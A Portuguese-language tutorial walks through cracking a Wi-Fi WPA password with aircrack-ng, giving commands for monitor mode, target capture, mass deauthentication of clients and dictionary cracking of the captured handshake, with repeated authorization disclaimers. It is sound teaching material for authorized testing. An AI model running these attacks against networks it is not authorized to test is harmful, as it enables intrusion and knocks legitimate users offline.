# Crackeando Senhas Wi-Fi com Aircrack-ng

Este tutorial ensina o uso dos comandos do pacote `aircrack-ng` para capturar e quebrar senhas de redes Wi-Fi. **Atenção:** Esta prática deve ser realizada apenas em redes que você tem autorização para testar, respeitando as leis e a privacidade de terceiros.

## Pré-requisitos

- Linux com privilégios de superusuário (comando `sudo`)
- Placa de rede compatível com modo monitor
- Pacote `aircrack-ng` instalado (`sudo apt install aircrack-ng`)

---

## Passo a Passo

### 1. Desativar Serviços Conflitantes

Primeiro, desative serviços que possam interferir com o processo de captura de pacotes:
```bash
sudo airmon-ng check kill
```

Este comando interrompe temporariamente serviços como o `NetworkManager` que podem afetar a operação da placa de rede em modo monitor.

### 2. Iniciar o Modo Monitor

Ative o modo monitor para sua interface de rede:
```bash
sudo airmon-ng start wlan0
```

Substitua `wlan0` pela sua interface de rede, caso necessário. Após isso, o nome da interface será modificado para algo como `wlan0mon`.

### 3. Capturar Pacotes em Redes Próximas

Escaneie as redes Wi-Fi próximas para identificar o ponto de acesso alvo:
```bash
sudo airodump-ng wlan0mon
```

Observe as redes disponíveis. Identifique o **BSSID** (endereço MAC do roteador), **canal** (CH) e outros detalhes da rede que você deseja testar.

### 4. Focar na Rede Alvo

Capture pacotes especificamente para a rede alvo:
```bash
sudo airodump-ng -c <canal> --bssid <bssid> -w capture wlan0mon
```

Substitua:
- `<canal>`: Canal da rede alvo (obtido na etapa anterior).
- `<bssid>`: BSSID da rede alvo.
- `capture`: Nome do arquivo onde os pacotes capturados serão salvos.

### 5. Realizar Desautenticação (Opcional)

Para forçar clientes conectados à rede a se desconectarem e capturar pacotes de handshake (usados para a quebra da senha):
```bash
sudo aireplay-ng --deauth 1000 -a '<bssid>' -c '<mac_cliente>' wlan0
```

Substitua:
- `<bssid>`: BSSID da rede alvo.
- `<mac_cliente>`: Endereço MAC do cliente conectado (opcional; se omitido, desconecta todos os clientes).

O parâmetro `-deauth 1000` envia 1000 pacotes de desautenticação.

### 6. Quebrando a Senha

Quando tiver capturado um handshake, utilize o `aircrack-ng` para tentar quebrar a senha com uma wordlist:
```bash
sudo aircrack-ng -w 'wordlist.txt' 'capture-01.cap'
```

Substitua:
- `wordlist.txt`: Caminho para a wordlist contendo possíveis senhas.
- `capture-01.cap`: Arquivo de captura (o nome gerado pelo `airodump-ng`).

---

## Considerações Finais

Estes passos devem ser realizados apenas em redes nas quais você tem permissão para testar. O uso indevido dessas ferramentas é ilegal e pode resultar em penalidades.

### Recursos e Referências

- [Documentação do Aircrack-ng](https://www.aircrack-ng.org/)
- [Wordlists para Brute Force](https://github.com/danielmiessler/SecLists)

---

**Disclaimer:** Este guia é para fins educacionais. Use as ferramentas com responsabilidade.

